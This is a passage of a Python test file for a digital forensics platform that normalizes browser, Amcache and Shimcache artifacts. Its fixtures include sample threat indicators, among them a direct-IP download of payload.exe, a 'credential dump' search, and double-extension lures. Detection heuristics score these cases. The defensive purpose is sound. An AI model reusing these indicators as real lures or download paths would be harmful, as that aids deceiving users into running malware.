    path.write_text("dummy", encoding="utf-8")
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "browser", "name": path.name, "source_path": str(path), "parser": "unsupported_sensitive_artifact"})
    assert docs == []


def test_browser_chrome_webkit_timestamp_conversion() -> None:
    row = {
        "Browser": "chrome",
        "Profile": "Default",
        "URL": "https://www.google.com/search?q=dfir+windows+forensics",
        "Visit Time": "13390747200000000",
        "SourceFile": "C:\\Users\\dfir\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "browser", "name": "History", "source_path": row["SourceFile"], "parser": "browser_chromium_history", "source_format": "sqlite"})
    assert doc["artifact"]["type"] == "browser"
    assert doc["artifact"]["parser"] == "browser_chromium_history"
    assert doc["event"]["type"] == "browser_visit"
    assert doc["timestamp_precision"] == "browser_visit_time"
    assert doc["@timestamp"] is not None
    assert doc["url"]["full"] == "https://www.google.com/search?q=dfir+windows+forensics"
    assert doc["url"]["domain"] == "www.google.com"
    assert doc["url"]["scheme"] == "https"
    assert doc["url"]["path"] == "/search"
    assert doc["url"]["query"] == "q=dfir+windows+forensics"


def test_browser_suspicious_http_ip_exe_download_has_high_risk(tmp_path: Path) -> None:
    path = tmp_path / "browser_suspicious.csv"
    path.write_text(
        "Browser,Profile,Download URL,Target Path,Download End Time,State,SourceFile\n"
        "Chrome,Default,http://185.10.10.10/payload.exe,C:\\Users\\dfir\\AppData\\Local\\Temp\\payload.exe,2026-05-03T10:00:10Z,Complete,C:\\Users\\dfir\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "browser", "name": path.name, "source_path": str(path), "parser": "browser_csv", "browser_artifact_type": "download"})[0]
    assert doc["artifact"]["type"] == "browser"
    assert doc["url"]["domain"] == "185.10.10.10"
    assert doc["download"]["file_name"] == "payload.exe"
    assert doc["network"]["direction"] == "download"
    assert "Browser downloaded executable" in doc["suspicious_reasons"]
    assert "Browser download to user-writable path" in doc["suspicious_reasons"]
    assert "Browser download over HTTP" in doc["suspicious_reasons"]
    assert "Browser URL uses direct IP" in doc["suspicious_reasons"]
    assert doc["risk_score"] >= 70
    assert doc["execution"]["is_execution_confirmed"] is False


def test_browser_jsonl_download_normalization_populates_download_blocks(tmp_path: Path) -> None:
    path = tmp_path / "chrome_downloads_sample.jsonl"
    path.write_text(
        "\n".join(
            [
                json.dumps(
                    {
                        "Browser": "Chrome",
                        "Profile": "Default",
                        "Url": "http://185.10.10.10/payload.exe",
                        "TargetPath": "C:\\Users\\dfir\\AppData\\Local\\Temp\\payload.exe",
                        "EndTime": "2026-05-03T10:00:10Z",
                        "State": "complete",
                        "SourceFile": "C:\\Users\\dfir\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
                    }
                )
            ]
        ),
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {
            "artifact_type": "browser",
            "name": path.name,
            "source_path": str(path),
            "parser": "browser_jsonl",
            "browser_artifact_type": "download",
            "source_format": "jsonl",
        },
    )
    doc = docs[0]
    assert doc["event"]["type"] == "file_downloaded"
    assert doc["browser"]["artifact_type"] == "download"
    assert doc["download"]["url"] == "http://185.10.10.10/payload.exe"
    assert doc["download"]["target_path"] == "C:\\Users\\dfir\\AppData\\Local\\Temp\\payload.exe"
    assert doc["download"]["file_name"] == "payload.exe"
    assert doc["file"]["name"] == "payload.exe"
    assert doc["file"]["extension"] == ".exe"
    assert doc["network"]["direction"] == "download"
    assert "Browser downloaded executable" in doc["suspicious_reasons"]
    assert "Browser download to user-writable path" in doc["suspicious_reasons"]
    assert "Browser download over HTTP" in doc["suspicious_reasons"]
    assert "Browser URL uses direct IP" in doc["suspicious_reasons"]
    assert doc["risk_score"] >= 70
    assert doc["execution"]["is_execution_confirmed"] is False


def test_browser_firefox_prtime_normalization() -> None:
    row = {
        "Browser": "Firefox",
        "Profile": "abcd.default-release",
        "URL": "https://github.com/",
        "Last Visit Time": "1746780000000000",
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\abcd.default-release\\places.sqlite",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "browser", "name": "places.sqlite", "source_path": row["SourceFile"], "parser": "browser_firefox_places", "source_format": "sqlite"})
    assert doc["artifact"]["parser"] == "browser_firefox_places"
    assert doc["browser"]["browser"] == "firefox"
    assert doc["event"]["type"] == "browser_visit"
    assert doc["timestamp_precision"] == "browser_visit_time"


def test_browser_extracts_user_from_urlencoded_source_path() -> None:
    row = {
        "Browser": "Chrome",
        "Profile": "Default",
        "URL": "https://www.marca.com/",
        "Visit Time": "13390747200000000",
        "SourceFile": "C%3A/Users/dfir/AppData/Local/Google/Chrome/User Data/Default/History",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "browser", "name": "History", "source_path": row["SourceFile"], "parser": "browser_chromium_history", "source_format": "sqlite"})
    assert doc["user"]["name"] == "dfir"


def test_browser_sanitize_event_hydrates_top_level_url_block() -> None:
    event = {
        "id": "browser-1",
        "artifact": {"type": "browser", "parser": "browser_chromium_history"},
        "browser": {"url": "https://www.marca.com/foo?a=1"},
        "network": {"url": "https://www.marca.com/foo?a=1"},
        "url": {},
        "event": {"type": "browser_visit"},
    }
    sanitized = _sanitize_event(event, DebugExportRequest())
    assert sanitized["url"]["full"] == "https://www.marca.com/foo?a=1"
    assert sanitized["url"]["domain"] == "www.marca.com"
    assert sanitized["url"]["scheme"] == "https"
    assert sanitized["url"]["path"] == "/foo"
    assert sanitized["url"]["query"] == "a=1"


def test_browser_sanitize_event_preserves_download_block() -> None:
    event = {
        "id": "browser-download-1",
        "artifact": {"type": "browser", "parser": "browser_jsonl"},
        "browser": {"artifact_type": "download", "url": "http://185.10.10.10/payload.exe"},
        "download": {
            "url": "http://185.10.10.10/payload.exe",
            "target_path": "C:\\Users\\dfir\\AppData\\Local\\Temp\\payload.exe",
            "file_name": "payload.exe",
            "state": "complete",
        },
        "url": {"full": "http://185.10.10.10/payload.exe"},
        "event": {"type": "file_downloaded"},
    }
    sanitized = _sanitize_event(event, DebugExportRequest())
    assert sanitized["download"]["url"] == "http://185.10.10.10/payload.exe"
    assert sanitized["download"]["target_path"] == "C:\\Users\\dfir\\AppData\\Local\\Temp\\payload.exe"
    assert sanitized["download"]["file_name"] == "payload.exe"


def test_browser_parse_report_counts_all_browser_events() -> None:
    path = Path(__file__).parent / "fixtures" / "browser_downloads_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "browser", "name": path.name, "source_path": str(path), "parser": "browser_csv", "browser_artifact_type": "download"})
    report = _build_browser_parse_report(
        [
            {
                "artifact_type": "browser",
                "parser_name": "browser_csv",
                "records_read": len(docs),
                "records_parsed": len(docs),
                "records_indexed": len(docs),
                "source_file": str(path),
                "by_browser": {"chrome": len(docs)},
                "by_artifact_type": {"download": len(docs)},
                "by_event_type": {"file_downloaded": len(docs)},
            }
        ],
        [],
        docs[:2],
        selected_artifact_types=["browser"],
        scope="evidence",
    )
    assert report["records_indexed"] == len(docs)
    assert report["by_parser"]["browser_csv"] == len(docs)
    assert report["by_browser"]["chrome"] == len(docs)
    assert report["by_artifact_type"]["download"] == len(docs)
    assert report["by_event_type"]["file_downloaded"] == len(docs)
    assert report["download_count"] >= 1


def test_browser_parse_report_falls_back_to_row_level_counts_when_event_sample_is_partial() -> None:
    report = _build_browser_parse_report(
        [
            {
                "artifact_type": "browser",
                "parser_name": "browser_chromium_history",
                "records_read": 600,
                "records_parsed": 600,
                "records_indexed": 600,
                "source_file": "C%3A/Users/dfir/AppData/Local/Google/Chrome/User Data/Default/History",
                "history_count": 595,
                "search_count": 5,
            }
        ],
        [],
        [{"artifact": {"type": "browser"}, "browser": {"artifact_type": "history"}, "event": {"type": "browser_visit"}}],
        selected_artifact_types=["browser"],
        scope="evidence",
    )
    assert report["records_indexed"] == 600
    assert report["by_parser"]["browser_chromium_history"] == 600
    assert sum(report["by_browser"].values()) == 600
    assert sum(report["by_artifact_type"].values()) == 600
    assert sum(report["by_event_type"].values()) == 600
    assert report["history_count"] == 595
    assert report["search_count"] == 5


def test_browser_parse_report_uses_raw_audit_counters_and_browsers_seen() -> None:
    report = _build_browser_parse_report(
        [
            {
                "artifact_type": "browser",
                "parser_name": "browser_chromium_history",
                "records_read": 600,
                "records_parsed": 600,
                "records_indexed": 600,
                "source_file": "C%3A/Users/dfir/AppData/Local/Google/Chrome/User Data/Default/History",
                "history_count": 535,
                "search_count": 65,
                "download_count": 0,
                "browsers_seen": {"chrome": 535, "edge": 65},
            }
        ],
        [],
        [{"artifact": {"type": "browser"}, "browser": {"artifact_type": "history", "browser": "chrome"}, "event": {"type": "browser_visit"}}],
        selected_artifact_types=["browser"],
        scope="evidence",
    )
    assert report["records_indexed"] == 600
    assert report["by_browser"]["chrome"] == 535
    assert report["by_browser"]["edge"] == 65
    assert sum(report["by_browser"].values()) == 600
    assert report["by_artifact_type"]["history"] == 535
    assert report["by_artifact_type"]["search_term"] == 65
    assert report["by_event_type"]["browser_visit"] == 535
    assert report["by_event_type"]["browser_search"] == 65
    assert report["history_count"] == 535
    assert report["search_count"] == 65


def test_browser_parse_report_reconstructs_event_and_artifact_counts_from_events() -> None:
    report = _build_browser_parse_report(
        [
            {
                "artifact_type": "browser",
                "parser_name": "browser_chromium_history",
                "records_read": 600,
                "records_parsed": 600,
                "records_indexed": 600,
                "source_file": "C%3A/Users/dfir/AppData/Local/Google/Chrome/User Data/Default/History",
                "browsers_seen": {"chrome": 535, "edge": 65},
            }
        ],
        [],
        [
            *[
                {
                    "artifact": {"type": "browser", "parser": "browser_chromium_history"},
                    "browser": {"artifact_type": "history", "browser": "chrome"},
                    "event": {"type": "browser_visit"},
                }
                for _ in range(535)
            ],
            *[
                {
                    "artifact": {"type": "browser", "parser": "browser_chromium_history"},
                    "browser": {"artifact_type": "search_term", "browser": "edge"},
                    "event": {"type": "browser_search"},
                }
                for _ in range(65)
            ],
        ],
        selected_artifact_types=["browser"],
        scope="evidence",
    )
    assert report["records_indexed"] == 600
    assert sum(report["by_event_type"].values()) == 600
    assert sum(report["by_artifact_type"].values()) == 600
    assert report["by_event_type"]["browser_visit"] == 535
    assert report["by_event_type"]["browser_search"] == 65
    assert report["by_artifact_type"]["history"] == 535
    assert report["by_artifact_type"]["search_term"] == 65
    assert report["history_count"] == 535
    assert report["search_count"] == 65


def test_browser_parse_report_prefers_index_aggregates_when_available() -> None:
    report = _build_browser_parse_report(
        [],
        [],
        [
            {
                "artifact": {"type": "browser", "parser": "browser_chromium_history"},
                "browser": {"artifact_type": "history", "browser": "chrome"},
                "event": {"type": "browser_visit"},
            }
        ],
        selected_artifact_types=["browser"],
        scope="evidence",
        event_aggregates={
            "total": 600,
            "by_browser": {"chrome": 535, "edge": 65},
            "by_artifact_type": {"history": 456, "search_term": 78, "download": 66},
            "by_event_type": {"browser_visit": 456, "browser_search": 78, "file_downloaded": 66},
        },
    )
    assert report["records_indexed"] == 600
    assert report["by_browser"] == {"chrome": 535, "edge": 65}
    assert report["by_artifact_type"] == {"download": 66, "history": 456, "search_term": 78}
    assert report["by_event_type"] == {"browser_search": 78, "browser_visit": 456, "file_downloaded": 66}
    assert report["download_count"] == 66


def test_browser_sample_events_prefers_history_download_and_suspicious() -> None:
    history_path = Path(__file__).parent / "fixtures" / "browser_history_sample.csv"
    download_path = Path(__file__).parent / "fixtures" / "browser_downloads_sample.csv"
    events = normalize_file("case-1", "ev-1", "art-h", history_path, {"artifact_type": "browser", "name": history_path.name, "source_path": str(history_path), "parser": "browser_csv", "browser_artifact_type": "history"})
    events += normalize_file("case-1", "ev-1", "art-d", download_path, {"artifact_type": "browser", "name": download_path.name, "source_path": str(download_path), "parser": "browser_csv", "browser_artifact_type": "download"})
    sample = _build_browser_sample_events(events)
    assert sample
    assert any((item.get("browser") or {}).get("artifact_type") == "history" for item in sample)
    assert any((item.get("browser") or {}).get("artifact_type") == "download" for item in sample)


def test_browser_completed_empty_source_is_not_skipped() -> None:
    report = _build_browser_parse_report(
        [
            {
                "artifact_type": "browser",
                "parser_name": "browser_chromium_history",
                "parser_status": "completed",
                "records_read": 0,
                "records_parsed": 0,
                "records_indexed": 0,
                "source_file": "C%3A/Users/dfir/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History",
                "by_browser": {},
                "by_artifact_type": {},
                "by_event_type": {},
            }
        ],
        [],
        [],
        selected_artifact_types=["browser"],
        scope="evidence",
    )
    assert report["skipped_files"] == []
    assert report["browser_sources_parsed"] == 1
    assert report["browser_sources_with_events"] == 0
    assert report["empty_sources"][0]["status"] == "completed_empty"


def test_generate_debug_pack_scope_report_tracks_evidence_scope(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="ev-browser-1",
        case_id="case-1",
        original_filename="browser.zip",
        stored_path=str(tmp_path / "browser.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="ev-browser-1", artifact_types=["browser"])
    browser_event = {
        "id": "evt-1",
        "event_id": "evt-1",
        "case_id": "case-1",
        "evidence_id": "ev-browser-1",
        "artifact": {
            "type": "browser",
            "parser": "browser_chromium_history",
            "source_path": "C%3A/Users/dfir/AppData/Local/Google/Chrome/User Data/Default/History",
        },
        "event": {"type": "browser_visit", "timeline_include": True, "severity": "info"},
        "browser": {"artifact_type": "history", "browser": "chrome", "url": "https://www.marca.com/"},
        "url": {"full": "https://www.marca.com/", "domain": "www.marca.com", "scheme": "https", "path": "/", "query": None},
        "user": {"name": "dfir"},
        "search_text": "marca",
        "raw_summary": "Browser visit",
    }
    monkeypatch.setattr(
        "app.services.debug_export._fetch_events_for_scope",
        lambda context: {
            "sampled_events": [browser_event],
            "total_events": 600,
            "evtx_classification_sample": [],
            "scope_query": {"bool": {"filter": [{"term": {"evidence_id": "ev-browser-1"}}]}},
        },
    )
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr(
        "app.services.debug_export._load_manifests",
        lambda context: {
            "ev-browser-1": {
                "artifacts": [
                    {
                        "artifact_type": "browser",
                        "parser": "browser_chromium_history",
                        "source_path": "C%3A/Users/dfir/AppData/Local/Google/Chrome/User Data/Default/History",
                        "status": "completed",
                        "record_count": 600,
                        "ingest_audit": {
                            "records_read": 600,
                            "records_parsed": 600,
                            "events_indexed": 600,
                            "by_browser": {"chrome": 535, "edge": 65},
                            "history_count": 535,
                            "search_count": 65,
                        },
                    }
                ],
                "stats": {"indexed_events": 600},
                "files": [],
            }
        },
    )
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)

    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    scope_report = json.loads(archive.read("debug_export_scope_report.json").decode("utf-8"))
    browser_report = json.loads(archive.read("browser_parse_report.json").decode("utf-8"))
    assert scope_report["scope"] == "evidence"
    assert scope_report["evidence_id"] == "ev-browser-1"
    assert scope_report["events_found"] == 600
    assert scope_report["parser_audit_found"] == 1
    assert browser_report["records_indexed"] == 600
    assert browser_report["by_browser"]["chrome"] == 535
    assert browser_report["by_browser"]["edge"] == 65


def test_generate_debug_pack_scope_evidence_does_not_mix_other_evidence(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="ev-browser-1",
        case_id="case-1",
        original_filename="browser.zip",
        stored_path=str(tmp_path / "browser.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    other = Evidence(
        id="ev-other",
        case_id="case-1",
        original_filename="other.zip",
        stored_path=str(tmp_path / "other.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="11",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )

    class _FilteringSession(_FakeSession):
        def query(self, model):  # noqa: ANN001
            if model is Evidence:
                class _FilteringQuery(_FakeQuery):
                    def filter(self_inner, *args, **kwargs):  # noqa: ANN002, ANN003
                        filtered = list(self_inner.items)
                        for clause in args:
                            rhs = getattr(clause, "right", None)
                            value = getattr(rhs, "value", None)
                            if value in {"ev-browser-1", "ev-other"}:
                                filtered = [item for item in filtered if getattr(item, "id", None) == value]
                        return _FilteringQuery(filtered)

                return _FilteringQuery([evidence, other])
            return _FakeQuery([])

    session = _FilteringSession(case, [evidence, other])
    request = DebugExportRequest(scope="evidence", evidence_id="ev-browser-1", artifact_types=["browser"])
    monkeypatch.setattr(
        "app.services.debug_export._fetch_events_for_scope",
        lambda context: {
            "sampled_events": [
                {
                    "id": "evt-1",
                    "evidence_id": "ev-browser-1",
                    "artifact": {"type": "browser", "parser": "browser_chromium_history"},
                    "event": {"type": "browser_visit"},
                    "browser": {"artifact_type": "history", "browser": "chrome"},
                    "search_text": "x",
                    "raw_summary": "y",
                }
            ],
            "total_events": 1,
            "evtx_classification_sample": [],
            "scope_query": {"bool": {"filter": [{"term": {"evidence_id": "ev-browser-1"}}]}},
        },
    )
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr(
        "app.services.debug_export._load_manifests",
        lambda context: {
            "ev-browser-1": {
                "artifacts": [
                    {
                        "artifact_type": "browser",
                        "parser": "browser_chromium_history",
                        "source_path": "History",
                        "status": "completed",
                        "ingest_audit": {"records_read": 1, "records_parsed": 1, "events_indexed": 1},
                    }
                ],
                "stats": {"indexed_events": 1},
                "files": [],
            }
        },
    )
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)

    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    scope_report = json.loads(archive.read("debug_export_scope_report.json").decode("utf-8"))
    assert scope_report["evidence_ids_in_scope"] == ["ev-browser-1"]
    assert scope_report["sampled_event_evidence_ids"] == {"ev-browser-1": 1}


def test_browser_search_terms_fixture_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "browser_search_terms_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "browser", "name": path.name, "source_path": str(path), "parser": "generic_browser", "browser_artifact_type": "search_term"})
    google_doc = next(doc for doc in docs if doc["browser"]["search_terms"] == "credential dump")
    bing_doc = next(doc for doc in docs if doc["browser"]["search_engine"] == "Bing")
    assert google_doc["event"]["type"] == "browser_search"
    assert google_doc["browser"]["search_engine"] == "Google"
    assert bing_doc["browser"]["search_terms"] == "teamviewer download"
    assert "teamviewer" in bing_doc["search_text"].lower()


def test_artifact_classification_amcache() -> None:
    result = classify_artifact(Path("AmcacheParser_Output.csv"), ["ProgramName", "Publisher", "Path", "SHA1", "InstallDate"])
    assert result["artifact_type"] == "amcache"
    assert result["parser"] in {"zimmerman", "generic"}


def test_artifact_classification_shimcache() -> None:
    result = classify_artifact(Path("AppCompatCacheParser_Output.csv"), ["Path", "LastModifiedTime", "EntryNumber", "Executed"])
    assert result["artifact_type"] == "shimcache"


def test_artifact_classification_recentfilecache() -> None:
    result = classify_artifact(Path("RecentFileCache.csv"), ["EntryNumber", "Path", "LastWriteTime"])
    assert result["artifact_type"] == "appcompat"


def test_amcache_fixture_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "amcache_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "amcache", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    normal_doc = next(doc for doc in docs if doc["file"]["name"] == "updater.exe")
    suspicious_doc = next(doc for doc in docs if doc["file"]["name"] == "invoice.pdf.exe")
    appdata_doc = next(doc for doc in docs if doc["file"]["name"] == "runme.ps1")
    anydesk_doc = next(doc for doc in docs if doc["file"]["name"] == "AnyDesk.exe")
    loose_doc = next(doc for doc in docs if doc["amcache"]["program_id"] == "prog-005")
    assert normal_doc["artifact"]["type"] == "amcache"
    assert normal_doc["event"]["category"] == "execution"
    assert normal_doc["event"]["type"] == "program_observed"
    assert normal_doc["event"]["action"] == "amcache_program_observed"
    assert normal_doc["execution"]["is_execution_confirmed"] is False
    assert normal_doc["execution"]["confidence"] == "medium"
    assert normal_doc["execution"]["interpretation"] == "Amcache indicates program/file presence or inventory, not execution by itself"
    assert normal_doc["file"]["hash_sha1"] == "1111111111111111111111111111111111111111"
    assert normal_doc["file"]["hash_sha256"] == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    assert normal_doc["@timestamp"] == "2026-04-30T08:00:00+00:00"
    assert normal_doc["timestamp_precision"] == "compile_time"
    assert normal_doc["event"]["timeline_include"] is True
    assert "execution_candidate" in normal_doc["tags"]
    assert "amcache_not_execution_proof" in normal_doc["data_quality"]
    assert suspicious_doc["file"]["path"] == "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"
    assert suspicious_doc["event"]["type"] == "program_observed"
    assert "double_extension" in suspicious_doc["tags"]
    assert "user_writable_path" in suspicious_doc["tags"]
    assert "suspicious_path" in suspicious_doc["tags"]
    assert suspicious_doc["risk_score"] >= 20
    assert appdata_doc["event"]["category"] == "file"
    assert appdata_doc["event"]["type"] == "file_observed"
    assert appdata_doc["event"]["action"] == "amcache_file_observed"
    assert appdata_doc["execution"]["confidence"] == "low"
    assert "execution_candidate" not in appdata_doc["tags"]
    assert "user_writable_path" in appdata_doc["tags"]
    assert "remote_access_tool" in anydesk_doc["tags"]
    assert anydesk_doc["risk_score"] >= 20
    assert loose_doc["execution"]["confidence"] == "low"
    assert loose_doc["process"]["name"] == "LooseEntry.exe"
    assert loose_doc["@timestamp"] == "2026-05-03T09:00:00+00:00"
    assert loose_doc["timestamp_precision"] == "install_date"
    assert "Contoso Ltd" in normal_doc["search_text"]
    assert normal_doc["raw"]["ProgramName"] == "Contoso Updater"


def test_suspicious_double_extension_requires_decoy_plus_executable() -> None:
    suspicious = [
        "invoice.pdf.exe",
        "document.doc.exe",
        "photo.jpg.scr",
        "image.png.bat",
        "archive.zip.exe",
        "report.txt.vbs",
        "file.pdf.lnk",
        "something.docx.js",
        "report.xlsm.bat",
        "installer.rar.scr",
        "readme.txt.exe",
        "landing.html.pif",
    ]
    benign = [
        "windows-kb890830-x64-v5.140.exe",
        "AM_Delta_Patch_1.449.529.0.exe",
        "wsl_2.7.3.0_x64.msi",
        "chrome_124.0.6367.91.exe",
        "app-v0.76.5-windows-amd64.exe",
        "collector_velociraptor-v0.76.5-windows-amd64.exe",
        "setup_10.0.26100.1.exe",
        "wsl.exe",
    ]
    assert all(is_suspicious_double_extension(name) for name in suspicious)
    assert not any(is_suspicious_double_extension(name) for name in benign)


def test_amcache_without_timestamp_does_not_use_processed_at() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ProgramName": "No Time Tool",
            "Path": "C:\\Users\\alex\\Desktop\\notime.exe",
            "FileName": "notime.exe",
        },
        {
            "artifact_type": "amcache",
            "name": "amcache_no_time.csv",
            "source_path": "amcache_no_time.csv",
            "parser": "zimmerman",
            "parser_processed_at": "2026-05-13T20:00:00Z",
        },
    )
    assert doc["@timestamp"] is None
    assert doc["timestamp_precision"] == "unknown"
    assert doc["event"]["timeline_include"] is False
    assert "missing_timestamp" in doc["data_quality"]
    assert doc["ingest"]["processed_at"] == "2026-05-13T20:00:00+00:00"


def test_amcache_installed_program_uses_inventory_semantics() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ProgramName": "Contoso Agent",
            "ProgramVersion": "3.4.5",
            "Publisher": "Contoso",
            "InstallDate": "2026-05-10T08:15:00Z",
            "SourceFile": "Amcache.hve",
        },
        {
            "artifact_type": "amcache",
            "name": "Amcache.hve",
            "source_path": "Amcache.hve",
            "parser": "native_amcache",
        },
    )
    assert doc["artifact"]["type"] == "amcache"
    assert doc["event"]["category"] == "program_inventory"
    assert doc["event"]["type"] == "installed_program_observed"
    assert doc["event"]["action"] == "amcache_program_observed"
    assert doc["execution"]["source"] == "amcache"
    assert doc["execution"]["is_execution_confirmed"] is False
    assert doc["execution"]["confidence"] == "low"
    assert doc["execution"]["interpretation"] == "Amcache indicates program/file presence or inventory, not execution by itself"
    assert doc["@timestamp"] == "2026-05-10T08:15:00+00:00"
    assert doc["timestamp_precision"] == "install_date"
    assert doc["event"]["timeline_include"] is True
    assert "program_inventory" in doc["tags"]
    assert "amcache_not_execution_proof" in doc["data_quality"]


def test_amcache_system32_binary_is_not_suspicious_by_default() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ProgramName": "System Tool",
            "Path": "C:\\Windows\\System32\\calc.exe",
            "FileName": "calc.exe",
            "CompileTime": "2026-05-01T10:00:00Z",
        },
        {"artifact_type": "amcache", "name": "amcache.csv", "source_path": "amcache.csv", "parser": "zimmerman"},
    )
    assert "suspicious_path" not in doc["tags"]
    assert doc["risk_score"] == 0


def test_shimcache_fixture_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "shimcache_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "shimcache", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    cmd_doc = next(doc for doc in docs if doc["file"]["name"] == "cmd.exe")
    downloads_doc = next(doc for doc in docs if doc["file"]["name"] == "invoice.pdf.exe")
    unc_doc = next(doc for doc in docs if doc["file"]["path"] == "\\\\SERVER\\share\\remote.exe")
    assert cmd_doc["artifact"]["type"] == "shimcache"
    assert cmd_doc["event"]["type"] == "execution_candidate"
    assert cmd_doc["event"]["action"] == "shimcache_entry_observed"
    assert cmd_doc["execution"]["confidence"] == "low"
    assert cmd_doc["execution"]["is_execution_confirmed"] is False
    assert cmd_doc["execution"]["interpretation"] == "Shimcache/AppCompatCache indicates file presence or compatibility cache entry, not execution by itself"
    assert "lolbin" in cmd_doc["tags"]
    assert downloads_doc["execution"]["confidence"] == "low"
    assert downloads_doc["execution"]["is_execution_confirmed"] is False
    assert downloads_doc["shimcache"]["entry_number"] == "2"
    assert "double_extension" in downloads_doc["tags"]
    assert "user_writable_path" in downloads_doc["tags"]
    assert "unc_path" in unc_doc["tags"]
    assert "network_path" in unc_doc["tags"]
    assert unc_doc["raw"]["ControlSet"] == "ControlSet001"
    assert "shimcache_not_execution_proof" in downloads_doc["data_quality"]


def test_appcompat_fixture_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "appcompat_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "appcompat", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    doc = docs[0]
    assert doc["artifact"]["type"] == "appcompat"
    assert doc["event"]["type"] == "recentfilecache_entry"
    assert doc["execution"]["confidence"] == "low"
    assert doc["execution"]["is_execution_confirmed"] is False
    assert doc["appcompat"]["artifact_type"] == "recentfilecache_entry"


def test_shimcache_raw_candidate_descriptor(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.shimcache_native_available", lambda: True)
    descriptor = describe_raw_candidate("C%3A/Windows/System32/config/SYSTEM", "shimcache")
    assert descriptor is not None
    assert descriptor["parser"] == "shimcache_raw"
    assert descriptor["source_tool"] == "native_shimcache"
    assert descriptor["source_format"] == "registry_hive"


def test_shimcache_raw_parser_extracts_execution_candidate_and_deduplicates(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    key_ts = datetime(2026, 5, 3, 11, 0, tzinfo=UTC)
    value = _build_minimal_shimcache_win10_bytes(path="C%3A/Users/alex/Downloads/invoice.pdf.exe", last_modified=datetime(2026, 5, 3, 10, 0, tzinfo=UTC))
    roots = {
        "ControlSet001": _FakeRegistryKey("ControlSet001"),
        "CurrentControlSet": _FakeRegistryKey("CurrentControlSet"),
        "ControlSet001\\Control\\Session Manager\\AppCompatCache": _FakeRegistryKey(
            "ControlSet001\\Control\\Session Manager\\AppCompatCache",
            values={"AppCompatCache": value},
            timestamp=key_ts,
        ),
        "CurrentControlSet\\Control\\Session Manager\\AppCompatCache": _FakeRegistryKey(
            "CurrentControlSet\\Control\\Session Manager\\AppCompatCache",
            values={"AppCompatCache": value},
            timestamp=key_ts,
        ),
    }
    fake_module = _FakeRegistryModule()

    class _Registry(_FakeRegistryModule.Registry):
        def __init__(self, _: str):
            super().__init__(_, keys=roots)

    fake_module.Registry = _Registry
